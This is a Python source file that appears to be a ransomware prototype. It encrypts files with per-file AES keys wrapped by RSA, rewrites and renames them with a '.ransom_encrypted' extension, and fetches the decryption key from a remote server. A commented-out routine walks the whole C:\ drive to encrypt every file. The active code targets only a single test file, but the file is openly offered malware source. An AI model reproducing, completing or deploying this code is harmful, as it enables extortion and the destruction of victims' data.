import os
import asyncio
import http_requests

import aes_cipher
import rsa_cipher

# def encrypt_all_files(PUBLIC_KEY):
#     # iterate over files in
#     # that directory
#     for root, dirs, files in os.walk('C:\\'):
#         for filename in files:
#             print(os.path.join(root, filename))

# key always on line 2. Data begin from line 5
async def encrypt_file(filepath):
    with open(filepath, 'rb') as file:
        data = file.read()

    key = aes_cipher.generate_key()
    encripted_data = aes_cipher.encrypt(key, data)

    new_file_data = encripted_data.decode('utf-8')
    encrypted_key = rsa_cipher.encrypt(key)
    encrypted_key = encrypted_key.decode('utf-8')

    new_file_body = f'-----KEY BEGIN-----\n{encrypted_key}\n-----KEY END-----\n\n{new_file_data}'

    with open(filepath, 'w') as file:
        file.write(new_file_body)

    os.rename(filepath, f'{filepath}.ransom_encrypted')

    print(f'File encryption successfull - {filepath}')

async def decrypt_file(filepath):
    with open(filepath, 'rb') as file:
        content = file.read().splitlines()
        filename = file.name

    encrypted_aes_key = content[1] # in line 2
    aes_key = rsa_cipher.decrypt(encrypted_aes_key.decode('utf-8'))

    data = content[4:][0] # actualy body begins from line 5
    original_file_body = aes_cipher.decrypt(aes_key, data).decode('utf-8')

    with open(filepath, 'w') as file:
        file.write(original_file_body)

    original_filename = filename.split('.')[:-1]
    original_filename = '.'.join(original_filename)

    os.rename(filepath, original_filename)

    print(f'File decryption successfull - {filepath} to {original_filename}')


async def encrypt_files():
    await encrypt_file('RANSOM/ransom.txt')

async def decrypt_files():
    encrypted_fernet_key = rsa_cipher.get_encrypted_fernet_key()
    fernet_key = await http_requests.request_fernet_decryption(encrypted_fernet_key)

    rsa_cipher.init_decryptor(fernet_key.encode('ascii'))

    await decrypt_file('RANSOM/ransom.txt.ransom_encrypted')

async def main():
    rsa_cipher.setup()

    await encrypt_files()
    await decrypt_files()

    print('yey')

asyncio.run(main())